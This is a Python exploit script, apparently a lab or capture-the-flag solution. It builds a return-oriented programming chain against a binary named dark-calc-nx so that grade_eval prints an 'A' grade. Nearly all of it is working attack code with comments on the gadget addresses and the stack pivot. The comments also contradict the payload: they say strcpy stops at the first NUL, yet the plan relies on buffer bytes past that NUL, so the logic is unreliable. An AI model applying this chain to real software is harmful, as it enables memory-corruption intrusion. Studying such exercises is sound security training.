#!/usr/bin/env python3
"""Task 3: ROP chain against dark-calc-nx (NX + ASLR, non-PIE).

Only gadgets inside __libc_csu_init's tail (0x4019d0..0x401ae3) are
needed:

    0x401a2b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret

Setting the grade register rdi directly is impossible with those
gadgets (there is no pop rdi), so the chain instead jumps into the
middle of grade_eval at 0x401989 (right after `cmp [rbp-0x4], 4` and
the conditional jump).  grade_eval then computes 'A' = 0x45 - [rbp-0x4],
so we must arrange [rbp-0x4] == 4.

rbp is attacker-controlled via pop rbp.  It points into the global
command_buf (0x602090), which is itself written by the first line of
the payload through input()'s strcpy: bytes 4..7 of the input are
0x04 00 00 00, so [rbp-0x4] == [0x602094] == 4.  command_buf is in
.bss: its address is fixed, no leak needed.

After printf, grade_eval's leave/ret pivots onto command_buf:
[rbp] = command_buf[8..15] becomes rbp, and command_buf[16..23] is the
next return address, so the chain finishes in main (0x4019b4), which
reads EOF, prints the answer line and exits cleanly.
"""
import struct
import sys

# input() copies this line into command_buf (strcpy, so it stops at
# the first NUL).  command_buf[4..7] = 4  ->  [0x602094] == 4.
padding = (
    b"AAAA"                 # command_buf[0..3]: nonzero so strcpy copies
    + b"\x04\x00\x00\x00"   # command_buf[4..7]: the grade, read via rbp-4
    + b"B" * 8              # command_buf[8..15]: value popped into rbp
    + struct.pack("<Q", 0x4019B4)  # command_buf[16..23]: final return -> main
)

payload = padding  # 24 bytes up to the saved return address
payload += struct.pack("<Q", 0x401A2B)  # pop rbp; pop r12..r15; ret
payload += struct.pack("<Q", 0x602098)  # rbp  -> [rbp-0x4] == [0x602094] == 4
payload += struct.pack("<Q", 0)         # r12
payload += struct.pack("<Q", 0)         # r13
payload += struct.pack("<Q", 0)         # r14
payload += struct.pack("<Q", 0)         # r15
payload += struct.pack("<Q", 0x401989)  # grade_eval: mov eax,0x45; sub eax,[rbp-0x4]; call printf
payload += b"\n"

sys.stdout.buffer.write(payload)
